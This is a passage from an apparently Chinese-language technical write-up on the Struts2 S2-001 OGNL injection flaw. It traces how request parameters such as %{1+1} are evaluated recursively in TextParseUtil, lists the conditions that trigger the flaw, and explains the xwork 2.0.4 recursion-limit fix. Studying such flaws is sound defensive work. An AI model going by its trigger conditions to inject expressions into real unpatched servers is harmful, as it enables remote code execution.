            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">getStack</span><span class="o">().</span><span class="na">findValue</span><span class="o">(</span><span class="n">expr</span><span class="o">,</span> <span class="n">toType</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>跟进 TextParseUtil.translateVariables(&lsquo;%&rsquo;, expr, this.stack); 实现：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TextParseUtil</span> <span class="o">{</span>


    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">translateVariables</span><span class="o">(</span><span class="kt">char</span> <span class="n">open</span><span class="o">,</span> <span class="n">String</span> <span class="n">expression</span><span class="o">,</span> <span class="n">ValueStack</span> <span class="n">stack</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">return</span> <span class="n">translateVariables</span><span class="o">(</span><span class="n">open</span><span class="o">,</span> <span class="n">expression</span><span class="o">,</span> <span class="n">stack</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kc">null</span><span class="o">).</span><span class="na">toString</span><span class="o">();</span>
    <span class="o">}</span>


    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">translateVariables</span><span class="o">(</span><span class="kt">char</span> <span class="n">open</span><span class="o">,</span> <span class="n">String</span> <span class="n">expression</span><span class="o">,</span> <span class="n">ValueStack</span> <span class="n">stack</span><span class="o">,</span> <span class="n">Class</span> <span class="n">asType</span><span class="o">,</span> <span class="n">ParsedValueEvaluator</span> <span class="n">evaluator</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// deal with the &#34;pure&#34; expressions first!
</span><span class="c1"></span>        <span class="c1">//expression = expression.trim();
</span><span class="c1"></span>        <span class="n">Object</span> <span class="n">result</span> <span class="o">=</span> <span class="n">expression</span><span class="o">;</span>


        <span class="c1">// 循环执行
</span><span class="c1"></span>        <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>

        	<span class="c1">// expression= %{password}
</span><span class="c1"></span>        	<span class="c1">// 这段代码就是剔除${}, 保留password
</span><span class="c1"></span>            <span class="kt">int</span> <span class="n">start</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">open</span> <span class="o">+</span> <span class="s">&#34;{&#34;</span><span class="o">);</span>
            <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
            <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="n">start</span> <span class="o">+</span> <span class="n">2</span><span class="o">;</span>
            <span class="kt">int</span> <span class="n">end</span><span class="o">;</span>
            <span class="kt">char</span> <span class="n">c</span><span class="o">;</span>
            <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">1</span><span class="o">;</span>
            <span class="k">while</span> <span class="o">(</span><span class="n">start</span> <span class="o">!=</span> <span class="o">-</span><span class="n">1</span> <span class="o">&amp;&amp;</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="n">length</span> <span class="o">&amp;&amp;</span> <span class="n">count</span> <span class="o">!=</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">c</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">charAt</span><span class="o">(</span><span class="n">x</span><span class="o">++);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;{&#39;</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">count</span><span class="o">++;</span>
                <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">c</span> <span class="o">==</span> <span class="sc">&#39;}&#39;</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">count</span><span class="o">--;</span>
                <span class="o">}</span>
            <span class="o">}</span>
            <span class="n">end</span> <span class="o">=</span> <span class="n">x</span> <span class="o">-</span> <span class="n">1</span><span class="o">;</span>



            <span class="k">if</span> <span class="o">((</span><span class="n">start</span> <span class="o">!=</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">end</span> <span class="o">!=</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="o">(</span><span class="n">count</span> <span class="o">==</span> <span class="n">0</span><span class="o">))</span> <span class="o">{</span>
                <span class="n">String</span> <span class="n">var</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">start</span> <span class="o">+</span> <span class="n">2</span><span class="o">,</span> <span class="n">end</span><span class="o">);</span>

                <span class="c1">// 第一次循环时，var是 password，执行返回结果是%{1+1},
</span><span class="c1"></span>                <span class="c1">// 第二次循环时，var是 1+1, 然后成功执行我们的恶意ognl表达式
</span><span class="c1"></span>                <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="n">stack</span><span class="o">.</span><span class="na">findValue</span><span class="o">(</span><span class="n">var</span><span class="o">,</span> <span class="n">asType</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">evaluator</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                	<span class="n">o</span> <span class="o">=</span> <span class="n">evaluator</span><span class="o">.</span><span class="na">evaluate</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
                <span class="o">}</span>
                

                <span class="n">String</span> <span class="n">left</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="n">start</span><span class="o">);</span>
                <span class="n">String</span> <span class="n">right</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">substring</span><span class="o">(</span><span class="n">end</span> <span class="o">+</span> <span class="n">1</span><span class="o">);</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">o</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                    <span class="k">if</span> <span class="o">(</span><span class="n">TextUtils</span><span class="o">.</span><span class="na">stringSet</span><span class="o">(</span><span class="n">left</span><span class="o">))</span> <span class="o">{</span>
                        <span class="n">result</span> <span class="o">=</span> <span class="n">left</span> <span class="o">+</span> <span class="n">o</span><span class="o">;</span>
                    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                        <span class="n">result</span> <span class="o">=</span> <span class="n">o</span><span class="o">;</span>
                    <span class="o">}</span>

                    <span class="k">if</span> <span class="o">(</span><span class="n">TextUtils</span><span class="o">.</span><span class="na">stringSet</span><span class="o">(</span><span class="n">right</span><span class="o">))</span> <span class="o">{</span>
                        <span class="n">result</span> <span class="o">=</span> <span class="n">result</span> <span class="o">+</span> <span class="n">right</span><span class="o">;</span>
                    <span class="o">}</span>
                    <span class="n">expression</span> <span class="o">=</span> <span class="n">left</span> <span class="o">+</span> <span class="n">o</span> <span class="o">+</span> <span class="n">right</span><span class="o">;</span>
                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                    <span class="c1">// the variable doesn&#39;t exist, so don&#39;t display anything
</span><span class="c1"></span>                    <span class="n">result</span> <span class="o">=</span> <span class="n">left</span> <span class="o">+</span> <span class="n">right</span><span class="o">;</span>
                    <span class="n">expression</span> <span class="o">=</span> <span class="n">left</span> <span class="o">+</span> <span class="n">right</span><span class="o">;</span>
                <span class="o">}</span>

            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                <span class="k">break</span><span class="o">;</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="n">XWorkConverter</span><span class="o">.</span><span class="na">getInstance</span><span class="o">().</span><span class="na">convertValue</span><span class="o">(</span><span class="n">stack</span><span class="o">.</span><span class="na">getContext</span><span class="o">(),</span> <span class="n">result</span><span class="o">,</span> <span class="n">asType</span><span class="o">);</span>
    <span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>如注释中所标注，最终在调用OgnlValueStack.findValue(）执行了我们的Ognl表达式<code>1+1</code>, 对OgnlValueStack不了解的同学，可以参考[3].</p>

<p>好了，分析完成, 漏洞造成原因是由于递归循环，将参数值当做ognl表达式进行执行，从而造成漏洞.</p>

<h3 id="0x03-漏洞细节">0x03 漏洞细节</h3>

<h4 id="1-为什么执行-password-表达式-能拿到我们请求的参数值-1-1">1. 为什么执行%{password}表达式，能拿到我们请求的参数值%{1+1}？</h4>

<p>该参数值是在ParametersInterceptor.java文件中进行设置的，熟悉Struts2框架的同学会Interceptor应该不陌生，我们看一下这个参数拦截器的实现代码:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ParametersInterceptor</span> <span class="kd">extends</span> <span class="n">MethodFilterInterceptor</span> <span class="o">{</span>

 
    <span class="kd">public</span> <span class="n">String</span> <span class="nf">doIntercept</span><span class="o">(</span><span class="n">ActionInvocation</span> <span class="n">invocation</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>

    	<span class="c1">// 获取当前请求的action, 也就是LoginAction
</span><span class="c1"></span>        <span class="n">Object</span> <span class="n">action</span> <span class="o">=</span> <span class="n">invocation</span><span class="o">.</span><span class="na">getAction</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(!(</span><span class="n">action</span> <span class="k">instanceof</span> <span class="n">NoParameters</span><span class="o">))</span> <span class="o">{</span>

            <span class="n">ActionContext</span> <span class="n">ac</span> <span class="o">=</span> <span class="n">invocation</span><span class="o">.</span><span class="na">getInvocationContext</span><span class="o">();</span>

            <span class="c1">// 获取当前请求的action的参数， 也就是我们的 password = %{1+1}
</span><span class="c1"></span>            <span class="kd">final</span> <span class="n">Map</span> <span class="n">parameters</span> <span class="o">=</span> <span class="n">ac</span><span class="o">.</span><span class="na">getParameters</span><span class="o">();</span>


            <span class="c1">// ... 省略n行
</span><span class="c1"></span>
            <span class="k">if</span> <span class="o">(</span><span class="n">parameters</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            	<span class="n">Map</span> <span class="n">contextMap</span> <span class="o">=</span> <span class="n">ac</span><span class="o">.</span><span class="na">getContextMap</span><span class="o">();</span>
                <span class="k">try</span> <span class="o">{</span>
         
                    <span class="c1">// ... 省略n行
</span><span class="c1"></span>
                    <span class="n">ValueStack</span> <span class="n">stack</span> <span class="o">=</span> <span class="n">ac</span><span class="o">.</span><span class="na">getValueStack</span><span class="o">();</span>

                    <span class="c1">// 将参数丢仅stack, 跟进代码实现...
</span><span class="c1"></span>                    <span class="n">setParameters</span><span class="o">(</span><span class="n">action</span><span class="o">,</span> <span class="n">stack</span><span class="o">,</span> <span class="n">parameters</span><span class="o">);</span>

                <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
                	<span class="c1">// ... 
</span><span class="c1"></span>                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">invocation</span><span class="o">.</span><span class="na">invoke</span><span class="o">();</span>
    <span class="o">}</span>


    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">setParameters</span><span class="o">(</span><span class="n">Object</span> <span class="n">action</span><span class="o">,</span> <span class="n">ValueStack</span> <span class="n">stack</span><span class="o">,</span> <span class="kd">final</span> <span class="n">Map</span> <span class="n">parameters</span><span class="o">)</span> <span class="o">{</span>

        <span class="n">ParameterNameAware</span> <span class="n">parameterNameAware</span> <span class="o">=</span> <span class="o">(</span><span class="n">action</span> <span class="k">instanceof</span> <span class="n">ParameterNameAware</span><span class="o">)</span>
                <span class="o">?</span> <span class="o">(</span><span class="n">ParameterNameAware</span><span class="o">)</span> <span class="n">action</span> <span class="o">:</span> <span class="kc">null</span><span class="o">;</span>

        <span class="n">Map</span> <span class="n">params</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
        <span class="k">if</span><span class="o">(</span> <span class="n">ordered</span> <span class="o">)</span> <span class="o">{</span>
            <span class="n">params</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TreeMap</span><span class="o">(</span><span class="n">getOrderedComparator</span><span class="o">());</span>
            <span class="n">params</span><span class="o">.</span><span class="na">putAll</span><span class="o">(</span><span class="n">parameters</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">params</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TreeMap</span><span class="o">(</span><span class="n">parameters</span><span class="o">);</span> 
        <span class="o">}</span>
        
        <span class="k">for</span> <span class="o">(</span><span class="n">Iterator</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">params</span><span class="o">.</span><span class="na">entrySet</span><span class="o">().</span><span class="na">iterator</span><span class="o">();</span> <span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">();)</span> <span class="o">{</span>


            <span class="n">Map</span><span class="o">.</span><span class="na">Entry</span> <span class="n">entry</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">)</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
            <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">entry</span><span class="o">.</span><span class="na">getKey</span><span class="o">().</span><span class="na">toString</span><span class="o">();</span>

              <span class="c1">// ... 省略n行
</span><span class="c1"></span>

            <span class="k">if</span> <span class="o">(</span><span class="n">acceptableName</span><span class="o">)</span> <span class="o">{</span>

            	<span class="c1">// 拿到我们的的%{1+1} 也就是我们的恶意ognl表达式
</span><span class="c1"></span>                <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">entry</span><span class="o">.</span><span class="na">getValue</span><span class="o">();</span>

                <span class="k">try</span> <span class="o">{</span>

                	<span class="c1">// 将我们的参数存放到Ognl Stack中， 
</span><span class="c1"></span>                	<span class="c1">// passsword=%{1+1}
</span><span class="c1"></span>                    <span class="n">stack</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>

                <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">RuntimeException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                  <span class="c1">// ...
</span><span class="c1"></span>                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>
    <span class="o">}</span> 
<span class="o">}</span></code></pre></td></tr></table>
</div>
</div>
<p>当你发送请求时，这个拦截器会将参数名及参数值存放到Stack中， 这就是为什么执行%{password}能够拿到我们的${1+1}， 所以漏洞触发必须有的流程：</p>

<ol>
<li>struts.tag.altSyntax配置为true，默认也就是true.</li>
<li>能够控制请求参数，及被请求的action中能够解析请求参数，也就是定义了对应的变量及对应的setter方法，如 private String password; , 不然ParametersInterceptor拦截器里获取不到参数.</li>
<li>跳转的jsp页面需要有个textfield标签, 及标签name属性和参数的key对应.</li>
</ol>

<h4 id="2-为什么网上总说从在说struts2-validation-表单验证-触发漏洞">2. 为什么网上总说从在说Struts2 Validation（表单验证）触发漏洞？</h4>

<p>我们上方漏洞触发的必须流程来看，在struts2框架中配置了Validation，如果表单验证失败，必然会跳转到表单提交页面，正好符合我们流程3， 也就是表单提交页面存在textfield标签, 从而触发了漏洞。（一般登录注册处容易出现这样的场景）</p>

<h3 id="0x04-总结">0x04 总结</h3>

<blockquote>
<p>Strtus2框架在开启struts.tag.altSyntax的情况下， 由于Struts2框架将请求参数值当做Ognl表达式执行，从而导致任意代码执行.</p>
</blockquote>

<h3 id="0x05-修复方案分析">0x05 修复方案分析</h3>

<p>官方建议Struts升级至2.0.9版本或XWork升级2.0.4版本，上方我们进行分析时，已经得知问题是出在xwork框架中，所以升级xwork版本即可。</p>

<p>我们分析一下修复代码：</p>

<ol>
<li><a href="https://archive.apache.org/dist/struts/source/struts-2.0.8-src.zip">struts2 2.0.8源码下载</a></li>
<li><a href="https://archive.apache.org/dist/struts/source/struts-2.0.9-src.zip">struts2 2.0.9源码下载</a></li>
</ol>

<p>通过分析struts 2.0.9的源码，我们从pom.xml文件中得知，其依赖的xwork包升级为2.0.4 修复了漏洞， 如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-xml" data-lang="xml"> <span class="nt">&lt;dependency&gt;</span>
            <span class="nt">&lt;groupId&gt;</span>com.opensymphony<span class="nt">&lt;/groupId&gt;</span>
            <span class="nt">&lt;artifactId&gt;</span>xwork<span class="nt">&lt;/artifactId&gt;</span>
            <span class="nt">&lt;version&gt;</span>2.0.4<span class="nt">&lt;/version&gt;</span>
 <span class="nt">&lt;/dependency&gt;</span></code></pre></td></tr></table>
</div>
</div>
<p>我们分析一下xwork2.0.4是怎么修复的漏洞</p>

<ol>
<li><p><a href="http://central.maven.org/maven2/opensymphony/xwork/2.0.3/xwork-2.0.3-sources.jar">XWork 2.0.3 源码下载</a></p></li>

<li><p><a href="http://central.maven.org/maven2/opensymphony/xwork/2.0.4/xwork-2.0.4-sources.jar">XWork 2.0.4 源码下载</a></p></li>
</ol>

<blockquote>
<p>TIPS: jar文件解压命令: jar xvf  xxx.jar</p>
</blockquote>

<p>上方我们分析过程中也是TextParseUtil这个类的translateVariables方法中执行了OGNL表达式，通过代码比较，我们发现2.0.4对TextParseUtil.java文件进行了修改，下方我们看一下2.0.4的代码：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TextParseUtil</span> <span class="o">{</span>

    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">MAX_RECURSION</span> <span class="o">=</span> <span class="n">1</span><span class="o">;</span>


    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">translateVariables</span><span class="o">(</span><span class="kt">char</span> <span class="n">open</span><span class="o">,</span> <span class="n">String</span> <span class="n">expression</span><span class="o">,</span> <span class="n">ValueStack</span> <span class="n">stack</span><span class="o">,</span> <span class="n">Class</span> <span class="n">asType</span><span class="o">,</span> <span class="n">ParsedValueEvaluator</span> <span class="n">evaluator</span><span class="o">)</span> <span class="o">{</span>


    	<span class="c1">// 加了一个MAX_RECURSION常量
</span><span class="c1"></span>        <span class="k">return</span> <span class="n">translateVariables</span><span class="o">(</span><span class="n">open</span><span class="o">,</span> <span class="n">expression</span><span class="o">,</span> <span class="n">stack</span><span class="o">,</span> <span class="n">asType</span><span class="o">,</span> <span class="n">evaluator</span><span class="o">,</span> <span class="n">MAX_RECURSION</span><span class="o">);</span>
    <span class="o">}</span>
    
    <span class="cm">/**
</span><span class="cm">     * Converted object from variable translation.
</span><span class="cm">     *
</span><span class="cm">     * @param open
</span><span class="cm">     * @param expression
</span><span class="cm">     * @param stack
</span><span class="cm">     * @param asType
</span><span class="cm">     * @param evaluator
</span><span class="cm">     * @return Converted object from variable translation.
</span><span class="cm">     */</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">translateVariables</span><span class="o">(</span><span class="kt">char</span> <span class="n">open</span><span class="o">,</span> <span class="n">String</span> <span class="n">expression</span><span class="o">,</span> <span class="n">ValueStack</span> <span class="n">stack</span><span class="o">,</span> <span class="n">Class</span> <span class="n">asType</span><span class="o">,</span> <span class="n">ParsedValueEvaluator</span> <span class="n">evaluator</span><span class="o">,</span> <span class="kt">int</span> <span class="n">maxLoopCount</span><span class="o">)</span> <span class="o">{</span>
        <span class="c1">// deal with the &#34;pure&#34; expressions first!
</span><span class="c1"></span>        <span class="c1">//expression = expression.trim();
</span><span class="c1"></span>        <span class="n">Object</span> <span class="n">result</span> <span class="o">=</span> <span class="n">expression</span><span class="o">;</span>
        <span class="kt">int</span> <span class="n">loopCount</span> <span class="o">=</span> <span class="n">1</span><span class="o">;</span>
        <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
        <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>


            <span class="c1">// 此时expression= %{name}
</span><span class="c1"></span>            <span class="kt">int</span> <span class="n">start</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">open</span> <span class="o">+</span> <span class="s">&#34;{&#34;</span><span class="o">,</span> <span class="n">pos</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">start</span> <span class="o">==</span> <span class="o">-</span><span class="n">1</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">pos</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
                <span class="n">loopCount</span><span class="o">++;</span>
                <span class="n">start</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">open</span> <span class="o">+</span> <span class="s">&#34;{&#34;</span><span class="o">);</span>
            <span class="o">}</span>

            <span class="c1">// 增加这段代码最为关键，由于我们已知maxLoopCount=1, 第二次循环时loopCount=2，则break跳出当前循环，从而避免了恶意ognl执行
</span><span class="c1"></span>            <span class="c1">// 其实下方注释已经写得很清楚了
</span><span class="c1"></span>            <span class="k">if</span> <span class="o">(</span><span class="n">loopCount</span> <span class="o">&gt;</span> <span class="n">maxLoopCount</span> <span class="o">)</span> <span class="o">{</span>
                <span class="c1">// translateVariables prevent infinite loop / expression recursive evaluation
</span><span class="c1"></span>                <span class="c1">// 译: 阻止无限循环,导致表达式递归计算
</span><span class="c1"></span>                <span class="k">break</span><span class="o">;</span>
            <span class="o">}</span>


            <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">expression</span><span class="o">.</span><span class="na">length</span><span class="o">();</span>
            <span class="kt">int</span> <span class="n">x</span> <span class="o">=</span> <span class="n">start</span> <span class="o">+</span> <span class="n">2</span><span class="o">;</span>
            <span class="kt">int</span> <span class="n">end</span><span class="o">;</span>
            <span class="kt">char</span> <span class="n">c</span><span class="o">;</span>
            <span class="kt">int</span> <span class="n">count</span> <span class="o">=</span> <span class="n">1</span><span class="o">;</span>
            <span class="k">while</span> <span class="o">(</span><span class="n">start</span> <span class="o">!=</span> <span class="o">-</span><span class="n">1</span> <span class="o">&amp;&amp;</span> <span class="n">x</span> <span class="o">&lt;</span> <span class="n">length</span> <span class="o">&amp;&amp;</span> <span class="n">count</span> <span class="o">!=</span> <span class="n">0</span><span class="o">)</span> <span class="o">{</span>
